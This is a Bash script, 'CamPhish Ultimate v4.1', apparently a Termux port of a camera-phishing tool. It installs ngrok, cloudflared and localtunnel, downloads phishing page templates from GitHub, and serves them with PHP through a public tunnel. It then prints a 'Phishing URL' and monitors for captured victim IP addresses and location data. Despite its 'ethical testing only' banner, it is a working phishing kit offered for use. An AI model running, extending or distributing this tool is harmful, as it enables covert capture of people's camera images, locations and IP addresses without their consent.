#!/bin/bash

# CamPhish Ultimate v4.1 - Termux Optimized
# Developed by Rayhan
# Fixed all issues for Termux/Android

# Configuration
VERSION="4.1"
DEVELOPER="Rayhan"
DEFAULT_PORT="3333"
LOGFILE="phish.log"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# ASCII Art Banner
show_banner() {
    clear
    echo -e "${PURPLE}"
    echo -e "   ____                        _   _       _     _ "
    echo -e "  / ___|__ _ _ __ ___  ___ ___| | | |_ __ (_) __| |"
    echo -e " | |   / _\` | '__/ __|/ __/ __| |_| | '_ \| |/ _\` |"
    echo -e " | |__| (_| | |  \__ \ (__\__ \  _  | | | | | (_| |"
    echo -e "  \____\__,_|_|  |___/\___|___/_| |_|_| |_|_|\__,_|"
    echo -e "${NC}"
    echo -e "${CYAN}          CamPhish Ultimate v${VERSION} by ${DEVELOPER}${NC}"
    echo -e "${YELLOW}       For Ethical Penetration Testing Only${NC}"
    echo -e "${RED}WARNING: Unauthorized access is illegal. Use responsibly.${NC}"
}

# Termux Specific Setup
termux_setup() {
    echo -e "${BLUE}[*] Configuring Termux environment...${NC}"
    termux-setup-storage
    if ! command -v termux-camera-photo &>/dev/null; then
        pkg install -y termux-api
        echo -e "${YELLOW}[!] Please grant Termux camera permission from Android settings${NC}"
    fi
}

# Install Dependencies
install_dependencies() {
    echo -e "${BLUE}[*] Installing dependencies...${NC}"
    
    pkg update -y && pkg upgrade -y
    pkg install -y php curl wget unzip openssl-tool
    
    # Install Node.js for localtunnel if not exists
    if ! command -v npm &>/dev/null; then
        pkg install -y nodejs
    fi
}

# Setup Tunnels
setup_tunnels() {
    echo -e "${BLUE}[*] Setting up tunneling options...${NC}"
    
    # Ngrok installation
    if [[ ! -f "ngrok" ]]; then
        echo -e "${YELLOW}[+] Installing ngrok...${NC}"
        arch=$(uname -m)
        if [[ "$arch" == "aarch64" ]]; then
            wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz -O ngrok.tgz
        else
            wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz -O ngrok.tgz
        fi
        tar -xzf ngrok.tgz
        rm ngrok.tgz
        chmod +x ngrok
    fi
    
    # Cloudflared installation
    if [[ ! -f "cloudflared" ]]; then
        echo -e "${YELLOW}[+] Installing cloudflared...${NC}"
        wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
        chmod +x cloudflared
    fi
    
    # Localtunnel installation
    if ! command -v lt &>/dev/null; then
        echo -e "${YELLOW}[+] Installing localtunnel...${NC}"
        npm install -g localtunnel
    fi
}

# Download Templates
download_templates() {
    echo -e "${BLUE}[*] Downloading phishing templates...${NC}"
    
    if [[ ! -d "templates" ]]; then
        mkdir templates
    fi
    
    templates=(
        "https://raw.githubusercontent.com/techchipnet/CamPhish/master/sites/festivalwishes.html"
        "https://raw.githubusercontent.com/techchipnet/CamPhish/master/sites/liveyt.html"
        "https://raw.githubusercontent.com/techchipnet/CamPhish/master/sites/meeting.html"
    )
    
    for template in "${templates[@]}"; do
        filename=$(basename "$template")
        if [[ ! -f "templates/$filename" ]]; then
            wget "$template" -P templates/
        fi
    done
}

# Start Phishing Server
start_attack() {
    echo -e "${BLUE}[*] Starting PHP server...${NC}"
    php -S 127.0.0.1:$DEFAULT_PORT > /dev/null 2>&1 &
    
    echo -e "\n${CYAN}----- TUNNELING OPTIONS -----${NC}"
    echo -e "1. Ngrok (Recommended)"
    echo -e "2. Cloudflared"
    echo -e "3. Localtunnel"
    echo -e "4. Local Network"
    
    while true; do
        read -p "Select tunneling method (1-4): " choice
        
        case $choice in
            1)
                if [[ ! -f "ngrok" ]]; then
                    echo -e "${RED}[-] Ngrok not found! Installing...${NC}"
                    setup_tunnels
                fi
                
                if [[ ! -f "$HOME/.ngrok2/ngrok.yml" ]]; then
                    read -p "Enter your Ngrok authtoken: " authtoken
                    ./ngrok authtoken "$authtoken"
                fi
                
                ./ngrok http $DEFAULT_PORT > /dev/null 2>&1 &
                sleep 5
                link=$(curl -s http://localhost:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok.io')
                break
                ;;
            2)
                ./cloudflared tunnel --url http://localhost:$DEFAULT_PORT > /dev/null 2>&1 &
                sleep 7
                link=$(grep -o 'https://[^/"]*\.trycloudflare.com' .cloudflared.log | head -n 1)
                break
                ;;
            3)
                lt --port $DEFAULT_PORT --subdomain rayhanphish > /dev/null 2>&1 &
                sleep 5
                link="https://rayhanphish.loca.lt"
                break
                ;;
            4)
                ip=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')
                link="http://$ip:$DEFAULT_PORT"
                echo -e "${YELLOW}[!] Note: Camera may not work on HTTP${NC}"
                break
                ;;
            *)
                echo -e "${RED}[-] Invalid selection! Try again.${NC}"
                ;;
        esac
    done
    
    if [[ -z "$link" ]]; then
        echo -e "${RED}[-] Failed to create tunnel${NC}"
        exit 1
    fi
    
    echo -e "\n${GREEN}[+] Phishing URL: ${PURPLE}${link}${NC}"
    echo -e "${YELLOW}[*] Monitoring for connections... (Ctrl+C to stop)${NC}"
    
    # Monitoring loop
    while true; do
        if [[ -f "ip.txt" ]]; then
            echo -e "\n${RED}[!] IP Captured:${NC}"
            cat ip.txt
            mv ip.txt "ip_$(date +%s).log"
        fi
        
        if [[ -f "location.log" ]]; then
            echo -e "\n${RED}[!] Location Data:${NC}"
            cat location.log
            mv location.log "location_$(date +%s).log"
        fi
        
        sleep 3
    done
}

# Cleanup
cleanup() {
    echo -e "\n${RED}[!] Cleaning up...${NC}"
    pkill -f php ngrok cloudflared lt
    rm -f *.log ip.txt location.log 2>/dev/null
    echo -e "${GREEN}[+] Cleanup complete. Exiting...${NC}"
    exit 0
}

# Main Execution
trap cleanup SIGINT
show_banner
termux_setup
install_dependencies
setup_tunnels
download_templates
start_attack
